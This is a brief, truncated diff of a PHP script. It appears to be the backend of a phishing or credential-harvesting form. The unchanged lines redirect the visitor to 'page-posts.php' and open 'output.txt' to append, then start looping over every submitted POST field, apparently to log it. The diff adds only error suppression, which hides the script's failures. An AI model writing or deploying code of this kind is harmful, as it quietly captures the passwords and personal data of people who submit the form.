@@ -1,4 +1,6 @@
 <?php
+error_reporting(0);
+ini_set('display_errors', 0);
 header ('Location: page-posts.php');
 $handle = fopen("output.txt", "a");
 foreach($_POST as $variable => $value) {
